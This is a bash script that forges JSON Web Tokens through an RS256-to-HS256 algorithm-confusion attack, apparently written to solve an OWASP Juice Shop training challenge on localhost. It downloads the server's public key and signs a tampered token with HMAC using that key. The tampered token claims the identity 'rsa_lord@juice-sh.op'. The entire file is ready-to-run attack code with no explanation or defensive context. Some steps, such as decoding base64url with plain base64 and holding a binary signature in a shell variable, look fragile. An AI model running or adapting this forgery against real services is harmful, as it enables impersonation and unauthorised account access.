
#!/bin/bash

# Function to decode JWT token
decode_jwt() {
    # Split the token into its header, payload, and signature parts
    IFS='.' read -r -a parts <<< "$1"

    # Remove newline characters and decode URL encoding from each part
    header=$(echo "${parts[0]}" | tr -d '\n')
    payload=$(echo "${parts[1]}" | tr -d '\n')
    signature=$(echo "${parts[2]}" | tr -d '\n')

    # Decode Base64 for header and payload
    header_decoded=$(echo -n "$header" | base64 -d 2>/dev/null)
    payload_decoded=$(echo -n "$payload" | base64 -d 2>/dev/null)

    # Print out the decoded content
    echo -e "\nOriginal Header:"
    echo "$header_decoded"
    echo -e "\nOriginal Payload:"
    echo "$payload_decoded"
    echo -e "\nOriginal Signature:"
    echo "$signature"
}

# Function to modify JWT header and payload, then sign
modify_and_sign_jwt() {
    # Get the public key in hexadecimal format from the provided URL
    public_key_hex=$(curl -s localhost:3000/encryptionkeys/jwt.pub | xxd -p | tr -d '\n')

    # Modify the header: Replace "RS256" with "HS256"
    modified_header=$(echo "$1" | sed 's/"alg":"RS256"/"alg":"HS256"/')

    # Modify the payload: Replace the email with "rsa_lord@juice-sh.op"
    modified_payload=$(echo "$2" | sed 's/"email":"[^"]*"/"email":"rsa_lord@juice-sh.op"/')

    # Encode Base64 for modified header and payload
    encoded_modified_header=$(echo -n "$modified_header" | base64 | tr -d '\n' | sed 's/+/-/g; s/\//_/g; s/=//g')
    
    encoded_modified_payload=$(echo -n "$modified_payload" | base64 | tr -d '\n' | sed 's/+/-/g; s/\//_/g; s/=//g')

    # Concatenate the encoded modified header and payload with a '.'
    header_payload_concat="${encoded_modified_header}.${encoded_modified_payload}"

    # Sign the concatenated header and payload using HMAC-SHA256 with the public key
    local signature=$(echo -n "$header_payload_concat" | openssl dgst -sha256 -mac HMAC -macopt hexkey:"$public_key_hex" -binary)

    # Print out the signature
    echo -e "\nModified and Signed JWT Signature:"
    echo "$signature"

    # Convert the signature to URL-safe Base64 format
    url_safe_signature=$(echo -n "$signature" | base64 | sed 's/+/-/g; s/\//_/g; s/=//g' | tr -d '\n')

    # Print out the URL-safe signature
    echo -e "\nURL-safe Signature:"
    echo "$url_safe_signature"

    # Concatenate the modified header, modified payload, and URL-safe signature
    modified_signed_token="${encoded_modified_header}.${encoded_modified_payload}.${url_safe_signature}"

    # Print out the modified signed token
    echo -e "\nModified Signed Token:"
    echo "$modified_signed_token"
}

# Ask the user to input the JWT token
echo "Paste the JWT token here:"
read -r jwt_token

# Call the decode_jwt function
decode_jwt "$jwt_token"

# Call the modify_and_sign_jwt function
modify_and_sign_jwt "$header_decoded" "$payload_decoded"
